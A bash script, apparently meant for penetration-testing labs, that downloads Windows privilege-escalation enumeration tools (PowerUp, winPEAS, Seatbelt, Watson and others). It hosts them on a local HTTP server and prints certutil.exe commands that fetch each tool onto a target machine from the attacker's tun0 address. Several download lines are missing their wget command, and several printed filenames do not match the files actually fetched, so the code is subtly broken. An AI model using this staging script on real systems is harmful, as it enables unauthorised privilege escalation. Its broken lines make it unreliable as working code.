#!/bin/bash

if [ ! -f "PowerUp.ps1" ]; then
  wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
fi

if [ ! -f "Sherlock.ps1" ]; then
  wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
fi

if [ ! -f "jaws-enum.ps1" ]; then
  wget https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1
fi

if [ ! -f "windows-exploit-suggester.py" ]; then
  wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py
fi

if [ ! -f "Seatbelt.exe" ]; then
  wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe
fi

if [ ! -f "SharpUp.exe" ]; then
  https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe
fi

if [ ! -f "Accesschk.exe" ]; then
  https://xor.cat/assets/other/Accesschk.zip
  unzip Accesschk.zip
fi

if [ ! -f "winPEASany.exe" ]; then
  https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe
fi

if [ ! -f "Watson.exe" ]; then
  https://github.com/4ndygu/precompiled-watsons/raw/master/Watson.exe
  fi


ip=$(ip addr | grep tun0 | grep inet | grep 10. | tr -s " " | cut -d " " -f 3 | cut -d "/" -f 1)

echo ""
echo "You can download any of these tools on your target using commands below:"
echo ""
echo "certutil.exe -urlcache -split -f http://$ip:8990/accesschk.exe accesschk.exe"
echo "certutil.exe -urlcache -split -f http://$ip:8990/winPEASany.exe winPEASany.exe"
echo "certutil.exe -urlcache -split -f http://$ip:8990/Seatbelt.exe Seatbelt.exe"
echo "certutil.exe -urlcache -split -f http://$ip:8990/SharpUp.exe SharpUp.exe"
echo "certutil.exe -urlcache -split -f http://$ip:8990/PowerUp.exe PowerUp.exe"
echo "certutil.exe -urlcache -split -f http://$ip:8990/Sherlock.exe Sherlock.exe"
echo "certutil.exe -urlcache -split -f http://$ip:8990/Watson.exe Watson.exe"
echo "certutil.exe -urlcache -split -f http://$ip:8990/jaws-enum.exe jaws-enum.exe"
echo ""

python3 -m http.server 8990
